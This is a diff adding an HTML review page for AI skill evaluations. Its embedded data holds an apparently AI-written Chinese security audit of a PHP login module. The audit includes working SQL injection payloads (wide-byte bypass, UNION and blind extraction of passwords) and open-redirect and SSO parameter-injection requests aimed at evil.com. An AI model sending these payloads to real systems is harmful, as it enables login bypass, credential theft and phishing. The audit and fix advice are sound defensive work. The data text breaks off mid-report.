@@ -1,0 +1,1325 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Eval Review</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@500;600&family=Lora:wght@400;500&display=swap" rel="stylesheet">
+  <script src="https://cdn.sheetjs.com/xlsx-0.20.3/package/dist/xlsx.full.min.js" integrity="sha384-EnyY0/GSHQGSxSgMwaIPzSESbqoOLSexfnSMN2AP+39Ckmn92stwABZynq1JyzdT" crossorigin="anonymous"></script>
+  <style>
+    :root {
+      --bg: #faf9f5;
+      --surface: #ffffff;
+      --border: #e8e6dc;
+      --text: #141413;
+      --text-muted: #b0aea5;
+      --accent: #d97757;
+      --accent-hover: #c4613f;
+      --green: #788c5d;
+      --green-bg: #eef2e8;
+      --red: #c44;
+      --red-bg: #fceaea;
+      --header-bg: #141413;
+      --header-text: #faf9f5;
+      --radius: 6px;
+    }
+
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+
+    body {
+      font-family: 'Lora', Georgia, serif;
+      background: var(--bg);
+      color: var(--text);
+      height: 100vh;
+      display: flex;
+      flex-direction: column;
+    }
+
+    /* ---- Header ---- */
+    .header {
+      background: var(--header-bg);
+      color: var(--header-text);
+      padding: 1rem 2rem;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      flex-shrink: 0;
+    }
+    .header h1 {
+      font-family: 'Poppins', sans-serif;
+      font-size: 1.25rem;
+      font-weight: 600;
+    }
+    .header .instructions {
+      font-size: 0.8rem;
+      opacity: 0.7;
+      margin-top: 0.25rem;
+    }
+    .header .progress {
+      font-size: 0.875rem;
+      opacity: 0.8;
+      text-align: right;
+    }
+
+    /* ---- Main content ---- */
+    .main {
+      flex: 1;
+      overflow-y: auto;
+      padding: 1.5rem 2rem;
+      display: flex;
+      flex-direction: column;
+      gap: 1.25rem;
+    }
+
+    /* ---- Sections ---- */
+    .section {
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: var(--radius);
+      flex-shrink: 0;
+    }
+    .section-header {
+      font-family: 'Poppins', sans-serif;
+      padding: 0.75rem 1rem;
+      font-size: 0.75rem;
+      font-weight: 500;
+      text-transform: uppercase;
+      letter-spacing: 0.05em;
+      color: var(--text-muted);
+      border-bottom: 1px solid var(--border);
+      background: var(--bg);
+    }
+    .section-body {
+      padding: 1rem;
+    }
+
+    /* ---- Config badge ---- */
+    .config-badge {
+      display: inline-block;
+      padding: 0.2rem 0.625rem;
+      border-radius: 9999px;
+      font-family: 'Poppins', sans-serif;
+      font-size: 0.6875rem;
+      font-weight: 600;
+      text-transform: uppercase;
+      letter-spacing: 0.03em;
+      margin-left: 0.75rem;
+      vertical-align: middle;
+    }
+    .config-badge.config-primary {
+      background: rgba(33, 150, 243, 0.12);
+      color: #1976d2;
+    }
+    .config-badge.config-baseline {
+      background: rgba(255, 193, 7, 0.15);
+      color: #f57f17;
+    }
+
+    /* ---- Prompt ---- */
+    .prompt-text {
+      white-space: pre-wrap;
+      font-size: 0.9375rem;
+      line-height: 1.6;
+    }
+
+    /* ---- Outputs ---- */
+    .output-file {
+      border: 1px solid var(--border);
+      border-radius: var(--radius);
+      overflow: hidden;
+    }
+    .output-file + .output-file {
+      margin-top: 1rem;
+    }
+    .output-file-header {
+      padding: 0.5rem 0.75rem;
+      font-size: 0.8rem;
+      font-weight: 600;
+      color: var(--text-muted);
+      background: var(--bg);
+      border-bottom: 1px solid var(--border);
+      font-family: 'SF Mono', SFMono-Regular, Consolas, 'Liberation Mono', Menlo, monospace;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+    .output-file-header .dl-btn {
+      font-size: 0.7rem;
+      color: var(--accent);
+      text-decoration: none;
+      cursor: pointer;
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+      font-weight: 500;
+      opacity: 0.8;
+    }
+    .output-file-header .dl-btn:hover {
+      opacity: 1;
+      text-decoration: underline;
+    }
+    .output-file-content {
+      padding: 0.75rem;
+      overflow-x: auto;
+    }
+    .output-file-content pre {
+      font-size: 0.8125rem;
+      line-height: 1.5;
+      white-space: pre-wrap;
+      word-break: break-word;
+      font-family: 'SF Mono', SFMono-Regular, Consolas, 'Liberation Mono', Menlo, monospace;
+    }
+    .output-file-content img {
+      max-width: 100%;
+      height: auto;
+      border-radius: 4px;
+    }
+    .output-file-content iframe {
+      width: 100%;
+      height: 600px;
+      border: none;
+    }
+    .output-file-content table {
+      border-collapse: collapse;
+      font-size: 0.8125rem;
+      width: 100%;
+    }
+    .output-file-content table td,
+    .output-file-content table th {
+      border: 1px solid var(--border);
+      padding: 0.375rem 0.5rem;
+      text-align: left;
+    }
+    .output-file-content table th {
+      background: var(--bg);
+      font-weight: 600;
+    }
+    .output-file-content .download-link {
+      display: inline-flex;
+      align-items: center;
+      gap: 0.5rem;
+      padding: 0.5rem 1rem;
+      background: var(--bg);
+      border: 1px solid var(--border);
+      border-radius: 4px;
+      color: var(--accent);
+      text-decoration: none;
+      font-size: 0.875rem;
+      cursor: pointer;
+    }
+    .output-file-content .download-link:hover {
+      background: var(--border);
+    }
+    .empty-state {
+      color: var(--text-muted);
+      font-style: italic;
+      padding: 2rem;
+      text-align: center;
+    }
+
+    /* ---- Feedback ---- */
+    .prev-feedback {
+      background: var(--bg);
+      border: 1px solid var(--border);
+      border-radius: 4px;
+      padding: 0.625rem 0.75rem;
+      margin-top: 0.75rem;
+      font-size: 0.8125rem;
+      color: var(--text-muted);
+      line-height: 1.5;
+    }
+    .prev-feedback-label {
+      font-size: 0.7rem;
+      font-weight: 600;
+      text-transform: uppercase;
+      letter-spacing: 0.04em;
+      margin-bottom: 0.25rem;
+      color: var(--text-muted);
+    }
+    .feedback-textarea {
+      width: 100%;
+      min-height: 100px;
+      padding: 0.75rem;
+      border: 1px solid var(--border);
+      border-radius: 4px;
+      font-family: inherit;
+      font-size: 0.9375rem;
+      line-height: 1.5;
+      resize: vertical;
+      color: var(--text);
+    }
+    .feedback-textarea:focus {
+      outline: none;
+      border-color: var(--accent);
+      box-shadow: 0 0 0 3px rgba(37, 99, 235, 0.1);
+    }
+    .feedback-status {
+      font-size: 0.75rem;
+      color: var(--text-muted);
+      margin-top: 0.5rem;
+      min-height: 1.1em;
+    }
+
+    /* ---- Grades (collapsible) ---- */
+    .grades-toggle {
+      display: flex;
+      align-items: center;
+      cursor: pointer;
+      user-select: none;
+    }
+    .grades-toggle:hover {
+      color: var(--accent);
+    }
+    .grades-toggle .arrow {
+      margin-right: 0.5rem;
+      transition: transform 0.15s;
+      font-size: 0.75rem;
+    }
+    .grades-toggle .arrow.open {
+      transform: rotate(90deg);
+    }
+    .grades-content {
+      display: none;
+      margin-top: 0.75rem;
+    }
+    .grades-content.open {
+      display: block;
+    }
+    .grades-summary {
+      font-size: 0.875rem;
+      margin-bottom: 0.75rem;
+      display: flex;
+      align-items: center;
+      gap: 0.5rem;
+    }
+    .grade-badge {
+      display: inline-block;
+      padding: 0.125rem 0.5rem;
+      border-radius: 9999px;
+      font-size: 0.75rem;
+      font-weight: 600;
+    }
+    .grade-pass { background: var(--green-bg); color: var(--green); }
+    .grade-fail { background: var(--red-bg); color: var(--red); }
+    .assertion-list {
+      list-style: none;
+    }
+    .assertion-item {
+      padding: 0.625rem 0;
+      border-bottom: 1px solid var(--border);
+      font-size: 0.8125rem;
+    }
+    .assertion-item:last-child { border-bottom: none; }
+    .assertion-status {
+      font-weight: 600;
+      margin-right: 0.5rem;
+    }
+    .assertion-status.pass { color: var(--green); }
+    .assertion-status.fail { color: var(--red); }
+    .assertion-evidence {
+      color: var(--text-muted);
+      font-size: 0.75rem;
+      margin-top: 0.25rem;
+      padding-left: 1.5rem;
+    }
+
+    /* ---- View tabs ---- */
+    .view-tabs {
+      display: flex;
+      gap: 0;
+      padding: 0 2rem;
+      background: var(--bg);
+      border-bottom: 1px solid var(--border);
+      flex-shrink: 0;
+    }
+    .view-tab {
+      font-family: 'Poppins', sans-serif;
+      padding: 0.625rem 1.25rem;
+      font-size: 0.8125rem;
+      font-weight: 500;
+      cursor: pointer;
+      border: none;
+      background: none;
+      color: var(--text-muted);
+      border-bottom: 2px solid transparent;
+      transition: all 0.15s;
+    }
+    .view-tab:hover { color: var(--text); }
+    .view-tab.active {
+      color: var(--accent);
+      border-bottom-color: var(--accent);
+    }
+    .view-panel { display: none; }
+    .view-panel.active { display: flex; flex-direction: column; flex: 1; overflow: hidden; }
+
+    /* ---- Benchmark view ---- */
+    .benchmark-view {
+      padding: 1.5rem 2rem;
+      overflow-y: auto;
+      flex: 1;
+    }
+    .benchmark-table {
+      border-collapse: collapse;
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: var(--radius);
+      font-size: 0.8125rem;
+      width: 100%;
+      margin-bottom: 1.5rem;
+    }
+    .benchmark-table th, .benchmark-table td {
+      padding: 0.625rem 0.75rem;
+      text-align: left;
+      border: 1px solid var(--border);
+    }
+    .benchmark-table th {
+      font-family: 'Poppins', sans-serif;
+      background: var(--header-bg);
+      color: var(--header-text);
+      font-weight: 500;
+      font-size: 0.75rem;
+      text-transform: uppercase;
+      letter-spacing: 0.04em;
+    }
+    .benchmark-table tr:hover { background: var(--bg); }
+    .benchmark-table tr.benchmark-row-with { background: rgba(33, 150, 243, 0.06); }
+    .benchmark-table tr.benchmark-row-without { background: rgba(255, 193, 7, 0.06); }
+    .benchmark-table tr.benchmark-row-with:hover { background: rgba(33, 150, 243, 0.12); }
+    .benchmark-table tr.benchmark-row-without:hover { background: rgba(255, 193, 7, 0.12); }
+    .benchmark-table tr.benchmark-row-avg { font-weight: 600; border-top: 2px solid var(--border); }
+    .benchmark-table tr.benchmark-row-avg.benchmark-row-with { background: rgba(33, 150, 243, 0.12); }
+    .benchmark-table tr.benchmark-row-avg.benchmark-row-without { background: rgba(255, 193, 7, 0.12); }
+    .benchmark-delta-positive { color: var(--green); font-weight: 600; }
+    .benchmark-delta-negative { color: var(--red); font-weight: 600; }
+    .benchmark-notes {
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: var(--radius);
+      padding: 1rem;
+    }
+    .benchmark-notes h3 {
+      font-family: 'Poppins', sans-serif;
+      font-size: 0.875rem;
+      margin-bottom: 0.75rem;
+    }
+    .benchmark-notes ul {
+      list-style: disc;
+      padding-left: 1.25rem;
+    }
+    .benchmark-notes li {
+      font-size: 0.8125rem;
+      line-height: 1.6;
+      margin-bottom: 0.375rem;
+    }
+    .benchmark-empty {
+      color: var(--text-muted);
+      font-style: italic;
+      text-align: center;
+      padding: 3rem;
+    }
+
+    /* ---- Navigation ---- */
+    .nav {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 1rem 2rem;
+      border-top: 1px solid var(--border);
+      background: var(--surface);
+      flex-shrink: 0;
+    }
+    .nav-btn {
+      font-family: 'Poppins', sans-serif;
+      padding: 0.5rem 1.25rem;
+      border: 1px solid var(--border);
+      border-radius: var(--radius);
+      background: var(--surface);
+      cursor: pointer;
+      font-size: 0.875rem;
+      font-weight: 500;
+      color: var(--text);
+      transition: all 0.15s;
+    }
+    .nav-btn:hover:not(:disabled) {
+      background: var(--bg);
+      border-color: var(--text-muted);
+    }
+    .nav-btn:disabled {
+      opacity: 0.4;
+      cursor: not-allowed;
+    }
+    .done-btn {
+      font-family: 'Poppins', sans-serif;
+      padding: 0.5rem 1.5rem;
+      border: 1px solid var(--border);
+      border-radius: var(--radius);
+      background: var(--surface);
+      color: var(--text);
+      cursor: pointer;
+      font-size: 0.875rem;
+      font-weight: 500;
+      transition: all 0.15s;
+    }
+    .done-btn:hover {
+      background: var(--bg);
+      border-color: var(--text-muted);
+    }
+    .done-btn.ready {
+      border: none;
+      background: var(--accent);
+      color: white;
+      font-weight: 600;
+    }
+    .done-btn.ready:hover {
+      background: var(--accent-hover);
+    }
+    /* ---- Done overlay ---- */
+    .done-overlay {
+      display: none;
+      position: fixed;
+      inset: 0;
+      background: rgba(0, 0, 0, 0.5);
+      z-index: 100;
+      justify-content: center;
+      align-items: center;
+    }
+    .done-overlay.visible {
+      display: flex;
+    }
+    .done-card {
+      background: var(--surface);
+      border-radius: 12px;
+      padding: 2rem 3rem;
+      text-align: center;
+      box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+      max-width: 500px;
+    }
+    .done-card h2 {
+      font-size: 1.5rem;
+      margin-bottom: 0.5rem;
+    }
+    .done-card p {
+      color: var(--text-muted);
+      margin-bottom: 1.5rem;
+      line-height: 1.5;
+    }
+    .done-card .btn-row {
+      display: flex;
+      gap: 0.5rem;
+      justify-content: center;
+    }
+    .done-card button {
+      padding: 0.5rem 1.25rem;
+      border: 1px solid var(--border);
+      border-radius: var(--radius);
+      background: var(--surface);
+      cursor: pointer;
+      font-size: 0.875rem;
+    }
+    .done-card button:hover {
+      background: var(--bg);
+    }
+    /* ---- Toast ---- */
+    .toast {
+      position: fixed;
+      bottom: 5rem;
+      left: 50%;
+      transform: translateX(-50%);
+      background: var(--header-bg);
+      color: var(--header-text);
+      padding: 0.625rem 1.25rem;
+      border-radius: var(--radius);
+      font-size: 0.875rem;
+      opacity: 0;
+      transition: opacity 0.3s;
+      pointer-events: none;
+      z-index: 200;
+    }
+    .toast.visible {
+      opacity: 1;
+    }
+  </style>
+</head>
+<body>
+  <div id="app" style="height:100vh; display:flex; flex-direction:column;">
+    <div class="header">
+      <div>
+        <h1>Eval Review: <span id="skill-name"></span></h1>
+        <div class="instructions">Review each output and leave feedback below. Navigate with arrow keys or buttons. When done, copy feedback and paste into Claude Code.</div>
+      </div>
+      <div class="progress" id="progress"></div>
+    </div>
+
+    <!-- View tabs (only shown when benchmark data exists) -->
+    <div class="view-tabs" id="view-tabs" style="display:none;">
+      <button class="view-tab active" onclick="switchView('outputs')">Outputs</button>
+      <button class="view-tab" onclick="switchView('benchmark')">Benchmark</button>
+    </div>
+
+    <!-- Outputs panel (qualitative review) -->
+    <div class="view-panel active" id="panel-outputs">
+    <div class="main">
+      <!-- Prompt -->
+      <div class="section">
+        <div class="section-header">Prompt <span class="config-badge" id="config-badge" style="display:none;"></span></div>
+        <div class="section-body">
+          <div class="prompt-text" id="prompt-text"></div>
+        </div>
+      </div>
+
+      <!-- Outputs -->
+      <div class="section">
+        <div class="section-header">Output</div>
+        <div class="section-body" id="outputs-body">
+          <div class="empty-state">No output files found</div>
+        </div>
+      </div>
+
+      <!-- Previous Output (collapsible) -->
+      <div class="section" id="prev-outputs-section" style="display:none;">
+        <div class="section-header">
+          <div class="grades-toggle" onclick="togglePrevOutputs()">
+            <span class="arrow" id="prev-outputs-arrow">&#9654;</span>
+            Previous Output
+          </div>
+        </div>
+        <div class="grades-content" id="prev-outputs-content"></div>
+      </div>
+
+      <!-- Grades (collapsible) -->
+      <div class="section" id="grades-section" style="display:none;">
+        <div class="section-header">
+          <div class="grades-toggle" onclick="toggleGrades()">
+            <span class="arrow" id="grades-arrow">&#9654;</span>
+            Formal Grades
+          </div>
+        </div>
+        <div class="grades-content" id="grades-content"></div>
+      </div>
+
+      <!-- Feedback -->
+      <div class="section">
+        <div class="section-header">Your Feedback</div>
+        <div class="section-body">
+          <textarea
+            class="feedback-textarea"
+            id="feedback"
+            placeholder="What do you think of this output? Any issues, suggestions, or things that look great?"
+          ></textarea>
+          <div class="feedback-status" id="feedback-status"></div>
+          <div class="prev-feedback" id="prev-feedback" style="display:none;">
+            <div class="prev-feedback-label">Previous feedback</div>
+            <div id="prev-feedback-text"></div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="nav" id="outputs-nav">
+      <button class="nav-btn" id="prev-btn" onclick="navigate(-1)">&#8592; Previous</button>
+      <button class="done-btn" id="done-btn" onclick="showDoneDialog()">Submit All Reviews</button>
+      <button class="nav-btn" id="next-btn" onclick="navigate(1)">Next &#8594;</button>
+    </div>
+    </div><!-- end panel-outputs -->
+
+    <!-- Benchmark panel (quantitative stats) -->
+    <div class="view-panel" id="panel-benchmark">
+      <div class="benchmark-view" id="benchmark-content">
+        <div class="benchmark-empty">No benchmark data available. Run a benchmark to see quantitative results here.</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Done overlay -->
+  <div class="done-overlay" id="done-overlay">
+    <div class="done-card">
+      <h2>Review Complete</h2>
+      <p>Your feedback has been saved. Go back to your Claude Code session and tell Claude you're done reviewing.</p>
+      <div class="btn-row">
+        <button onclick="closeDoneDialog()">OK</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- Toast -->
+  <div class="toast" id="toast"></div>
+
+  <script>
+    // ---- Embedded data (injected by generate_review.py) ----
+    const EMBEDDED_DATA = {"skill_name": "php-deep-audit", "runs": [{"id": "eval-auth-multi-with_skill-run-1", "prompt": "(No prompt found)", "eval_id": null, "outputs": [{"name": "audit-report.md", "type": "text", "content": "# PHP \u6df1\u5ea6\u5b89\u5168\u5ba1\u8ba1\u62a5\u544a \u2014 \u8ba4\u8bc1\u6a21\u5757\n\n## \u653b\u51fb\u9762\u5730\u56fe\n\n| \u5165\u53e3 | \u8def\u7531 | \u9274\u6743 | \u7528\u6237\u53ef\u63a7\u8f93\u5165 | \u5bf9\u5e94 Sink |\n|------|------|------|-------------|-----------|\n| `login()` | `POST /login` | \u65e0 | `$_POST['username']`, `$_POST['password']`, `$_POST['redirect']` | `mysqli->query()`, `header(\"Location: ...\")` |\n| `ssoCallback()` | `GET /login/callback` | \u65e0 | `$_GET['token']`, `$_GET['state']` | `curl_exec()` |\n\n**\u26a0\ufe0f \u5168\u90e8\u5165\u53e3\u65e0\u9700\u9274\u6743\uff0c\u653b\u51fb\u8005\u53ef\u76f4\u63a5\u5229\u7528\u3002**\n\n---\n\n## \u6f0f\u6d1e 1\uff1a[\u9ad8\u5371] SQL \u6ce8\u5165 \u2014 `addslashes()` + GBK \u7f16\u7801\u5bfc\u81f4\u5bbd\u5b57\u8282\u7ed5\u8fc7\n\n### \u4f20\u64ad\u94fe\u8def\n\n```\nSource:  $_POST['username']                                  \u2190 AuthController.php:25 (\u8def\u7531: POST /login)\n  \u2193 \u76f4\u63a5\u8d4b\u503c\uff0c\u65e0\u8fc7\u6ee4\n$username = $_POST['username'] ?? '';                        \u2190 AuthController.php:25\n  \u2193 \u4f5c\u4e3a\u7b2c\u4e00\u4e2a\u53c2\u6570\u4f20\u5165\n$this->authService->authenticate($username, $password)       \u2190 AuthController.php:33 (\u8de8\u6587\u4ef6 \u2192 AuthService.php)\n  \u2193 \u65b9\u6cd5\u7b7e\u540d\u63a5\u6536\npublic function authenticate($username, $password)            \u2190 AuthService.php:17\n  \u2193 addslashes() \u2014 \u5728 GBK \u7f16\u7801\u4e0b\u5f62\u540c\u865a\u8bbe\n$username = addslashes($username);                           \u2190 AuthService.php:20\n  \u2193 \u62fc\u63a5\u5230 SQL \u5b57\u7b26\u4e32\uff08\u5355\u5f15\u53f7\u5305\u88f9\uff09\n$sql = \"SELECT * FROM users\n        WHERE username = '{$username}'\n        AND password = '{$password}'\";                        \u2190 AuthService.php:26\n  \u2193\n$this->db->query($sql);                                      \u2190 AuthService.php:27  [SINK: mysqli::query]\n```\n\n### \u8fc7\u6ee4\u8bc4\u4f30\n\n| \u8282\u70b9 | \u64cd\u4f5c | \u6709\u6548\u6027 |\n|------|------|--------|\n| AuthService.php:20 | `addslashes($username)` | \u274c **\u5728 GBK \u7f16\u7801\u4e0b\u53ef\u88ab\u5bbd\u5b57\u8282\u6ce8\u5165\u7ed5\u8fc7** |\n| AuthService.php:11 | `$this->db->set_charset('gbk')` | \u26a0\ufe0f GBK \u7f16\u7801\u662f\u5bbd\u5b57\u8282\u6ce8\u5165\u7684\u524d\u63d0\u6761\u4ef6 |\n\n### \u5bbd\u5b57\u8282\u6ce8\u5165\u539f\u7406\n\n```\n\u653b\u51fb\u8005\u8f93\u5165:  username=%df' OR 1=1--\n              \u539f\u59cb\u5b57\u8282: 0xDF 0x27\n\naddslashes \u540e:  0xDF 0x5C 0x27\n               (\u5728\u5355\u5f15\u53f7 0x27 \u524d\u63d2\u5165\u8f6c\u4e49\u7b26 0x5C)\n\nGBK \u89e3\u7801:       0xDF5C (= \u904b) 0x27 (= ')\n              \u2191 0xDF+0x5C \u88ab\u5f53\u4f5c\u4e00\u4e2a GBK \u6c49\u5b57\uff0c\u8f6c\u4e49\u7b26\u88ab\"\u5403\u6389\"\n              \u5269\u4f59\u7684 0x27 \u6210\u529f\u9003\u9038\u51fa\u5b57\u7b26\u4e32\n\n\u6700\u7ec8 SQL:      SELECT * FROM users WHERE username = '\u904b' OR 1=1--'\n                                                          \u2191 \u6ce8\u5165\u6210\u529f\n```\n\n**\u5173\u952e\u70b9\uff1a** `$this->db->set_charset('gbk')` \u8bbe\u7f6e\u8fde\u63a5\u7684\u5b57\u7b26\u96c6\u4e3a GBK\uff0c\u8fd9\u5bfc\u81f4 `0xDF5C`\u3001`0x9C5C`\u3001`0x815C` \u7b49\u7ec4\u5408\u88ab\u89e3\u91ca\u4e3a\u5408\u6cd5\u6c49\u5b57\uff0c\u4ece\u800c\"\u5403\u6389\"\u4e86 `addslashes()` \u63d2\u5165\u7684 `\\`\uff080x5C\uff09\u3002\n\n### \u5229\u7528\u573a\u666f\n\n```\n# \u4e07\u80fd\u5bc6\u7801\u767b\u5f55\uff08\u7ed5\u8fc7\u8ba4\u8bc1\uff09\nPOST /login\nusername=%df' OR 1=1-- &password=anything\n\n# \u8054\u5408\u67e5\u8be2\u6ce8\u5165 \u2014 \u7a83\u53d6\u6570\u636e\u5e93\nPOST /login\nusername=%df' UNION SELECT 1,username,password,4 FROM users-- &password=x\n\n# \u76f2\u6ce8 \u2014 \u9010\u5b57\u7b26\u731c\u89e3\u5bc6\u7801\nPOST /login\nusername=%df' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a'-- &password=x\n```\n\n### \u4fee\u590d\u5efa\u8bae\n\n```php\n// \u65b9\u6848 A\uff08\u63a8\u8350 \u2014 \u6839\u9664\u5bbd\u5b57\u8282\u95ee\u9898\uff09\uff1a\u4f7f\u7528 PDO + \u9884\u5904\u7406\n// AuthService.php \u6784\u9020\u51fd\u6570\u4e2d\n$this->db = new \\PDO('mysql:host=localhost;dbname=shop;charset=utf8mb4', 'root', 'password');\n\n// authenticate() \u65b9\u6cd5\u4e2d\n$stmt = $this->db->prepare(\n    \"SELECT * FROM users WHERE username = :username AND password = :password\"\n);\n$stmt->execute(['username' => $username, 'password' => $password]);\n\n// \u65b9\u6848 B\uff08\u5982\u679c\u5fc5\u987b\u7528 mysqli\uff09\uff1a\u8bbe\u7f6e\u6b63\u786e\u7684 charset + \u4f7f\u7528 real_escape_string\n$this->db->set_charset('utf8mb4');  // \u4e0d\u7528 GBK\n$username = $this->db->real_escape_string($username);\n// \u6216\u4ecd\u7528\u9884\u5904\u7406\n$stmt = $this->db->prepare(\"SELECT * FROM users WHERE username = ? AND password = ?\");\n```\n\n---\n\n## \u6f0f\u6d1e 2\uff1a[\u4e2d\u5371] \u5f00\u653e\u91cd\u5b9a\u5411 \u2014 `buildRedirectUrl()` \u53ef\u88ab `//` \u534f\u8bae\u76f8\u5bf9 URL \u7ed5\u8fc7\n\n### \u4f20\u64ad\u94fe\u8def\n\n```\nSource:  $_POST['redirect']                                  \u2190 AuthController.php:27 (\u8def\u7531: POST /login)\n  \u2193 \u76f4\u63a5\u8d4b\u503c\uff0c\u9ed8\u8ba4 '/'\n$redirect = $_POST['redirect'] ?? '/';                       \u2190 AuthController.php:27\n  \u2193 \u767b\u5f55\u6210\u529f\u540e\u4f5c\u4e3a\u53c2\u6570\u4f20\u5165\n$this->authService->buildRedirectUrl($redirect)              \u2190 AuthController.php:43 (\u8de8\u6587\u4ef6 \u2192 AuthService.php)\n  \u2193 \u65b9\u6cd5\u7b7e\u540d\u63a5\u6536\npublic function buildRedirectUrl($url)                       \u2190 AuthService.php:39\n  \u2193 strpos \u68c0\u67e5 http:// \u6216 https:// \u2014 \u53ef\u88ab // \u7ed5\u8fc7\nif (strpos($url, 'http://') !== false ||\n    strpos($url, 'https://') !== false) {                    \u2190 AuthService.php:43\n    return '/';\n}\n  \u2193 \u68c0\u67e5\u672a\u547d\u4e2d\uff0c\u8fd4\u56de\u539f\u59cb $url\nreturn $url;                                                 \u2190 AuthService.php:47\n  \u2193 \u62fc\u63a5\u5230 header() \u4e2d\nheader(\"Location: {$targetUrl}\");                            \u2190 AuthController.php:44  [SINK]\n```\n\n### \u8fc7\u6ee4\u8bc4\u4f30\n\n| \u8282\u70b9 | \u64cd\u4f5c | \u6709\u6548\u6027 |\n|------|------|--------|\n| AuthService.php:43 | `strpos($url, 'http://')` | \u274c \u4ec5\u68c0\u67e5 `http://` \u6216 `https://` \u5b58\u5728\u6027\uff0c\u4e0d\u68c0\u67e5\u4f4d\u7f6e |\n| AuthService.php:43 | \u903b\u8f91\u6f0f\u6d1e | \u274c `//evil.com` \u4e0d\u542b `http://`\uff0c\u5b8c\u5168\u7ed5\u8fc7 |\n| AuthService.php:43 | \u903b\u8f91\u6f0f\u6d1e | \u274c `/\\\\evil.com` \u4e5f\u53ef\u80fd\u5728\u90e8\u5206\u6d4f\u89c8\u5668\u4e2d\u88ab\u89e3\u6790 |\n\n### \u5229\u7528\u573a\u666f\n\n```\n# \u9493\u9c7c\u653b\u51fb \u2014 \u767b\u5f55\u540e\u8df3\u8f6c\u5230\u4f2a\u9020\u9875\u9762\nPOST /login\nusername=admin&password=123456&redirect=//evil.com/phishing\n\n# \u6d4f\u89c8\u5668\u884c\u4e3a\uff1a//evil.com \u88ab\u89c6\u4e3a\u534f\u8bae\u76f8\u5bf9 URL\n# \u5982\u679c\u5f53\u524d\u9875\u9762\u662f https://\uff0c\u5219\u8df3\u8f6c\u5230 https://evil.com\n# \u5982\u679c\u5f53\u524d\u9875\u9762\u662f http://\uff0c\u5219\u8df3\u8f6c\u5230 http://evil.com\n```\n\n### \u4fee\u590d\u5efa\u8bae\n\n```php\n// \u65b9\u6848\uff1a\u767d\u540d\u5355 + \u5f3a\u5236\u76f8\u5bf9\u8def\u5f84\npublic function buildRedirectUrl($url)\n{\n    // \u53ea\u5141\u8bb8\u76f8\u5bf9\u8def\u5f84\uff0c\u62d2\u7edd\u6240\u6709\u7edd\u5bf9URL\n    if (preg_match('#^(https?:)?//#i', $url)) {\n        return '/';\n    }\n    // \u62d2\u7edd\u534f\u8bae\u76f8\u5bf9 URL\n    if (strpos($url, '//') === 0) {\n        return '/';\n    }\n    // \u786e\u4fdd\u4ee5 / \u5f00\u5934\n    if (strpos($url, '/') !== 0) {\n        return '/';\n    }\n    return $url;\n}\n\n// \u6216\u66f4\u7b80\u5355\uff1a\u767d\u540d\u5355\u65b9\u5f0f\n$allowedPaths = ['/', '/dashboard', '/profile', '/orders'];\nif (!in_array($url, $allowedPaths, true)) {\n    $url = '/';\n}\n```\n\n---\n\n## \u6f0f\u6d1e 3\uff1a[\u4e2d\u5371] SSO \u53c2\u6570\u6ce8\u5165 \u2014 `token`/`state` \u672a URL \u7f16\u7801\u5bfc\u81f4\u67e5\u8be2\u53c2\u6570\u7be1\u6539\n\n### \u4f20\u64ad\u94fe\u8def\n\n```\nSource:  $_GET['token']                                      \u2190 AuthController.php:57 (\u8def\u7531: GET /login/callback)\n  \u2193 \u76f4\u63a5\u8d4b\u503c\n$token = $_GET['token'];                                     \u2190 AuthController.php:57\n  \u2193\nSource:  $_GET['state']                                      \u2190 AuthController.php:57\n  \u2193 \u76f4\u63a5\u8d4b\u503c\n$state = $_GET['state'];                                     \u2190 AuthController.php:58\n  \u2193 \u4e24\u4e2a\u53c2\u6570\u4e00\u540c\u4f20\u5165 ssoVerify()\n$this->authService->ssoVerify($token, $state)                \u2190 AuthController.php:61 (\u8de8\u6587\u4ef6 \u2192 AuthService.php)\n  \u2193 \u65b9\u6cd5\u7b7e\u540d\u63a5\u6536\npublic function ssoVerify($token, $state)                    \u2190 AuthService.php:54\n  \u2193 \u76f4\u63a5\u62fc\u63a5\u5230 URL \u67e5\u8be2\u5b57\u7b26\u4e32\uff08\u672a urlencode\uff09\n$url = \"https://sso.example.com/verify?token={$token}\n        &state={$state}\";                                    \u2190 AuthService.php:57\n  \u2193\ncurl_setopt($ch, CURLOPT_URL, $url);                         \u2190 AuthService.php:64\ncurl_exec($ch);                                              \u2190 AuthService.php:66  [SINK: curl_exec]\n```\n\n### \u8fc7\u6ee4\u8bc4\u4f30\n\n| \u8282\u70b9 | \u64cd\u4f5c | \u6709\u6548\u6027 |\n|------|------|--------|\n| AuthService.php:57 | \u76f4\u63a5\u62fc\u63a5 `{$token}` | \u274c \u672a URL \u7f16\u7801\uff0c`&` \u548c `=` \u4f1a\u7834\u574f\u67e5\u8be2\u53c2\u6570\u7ed3\u6784 |\n| AuthService.php:57 | \u76f4\u63a5\u62fc\u63a5 `{$state}` | \u274c \u540c\u4e0a |\n| \u6574\u6761\u94fe\u8def | \u65e0\u4efb\u4f55\u8fc7\u6ee4 | \u274c |\n\n### \u5229\u7528\u573a\u666f\n\n```\n# \u573a\u666f 1\uff1a\u53c2\u6570\u6ce8\u5165 \u2014 token \u4e2d\u542b & \u622a\u65ad\nGET /login/callback?token=attacker_token&state=admin&redirect_uri=http://evil.com\n\n# \u5b9e\u9645\u53d1\u9001\u5230 SSO \u7684 URL \u53d8\u6210\uff1a\n# https://sso.example.com/verify?token=attacker_token&state=admin&redirect_uri=http://evil.com\n# redirect_uri \u88ab\u6ce8\u5165\u4e3a\u989d\u5916\u53c2\u6570\uff0cSSO 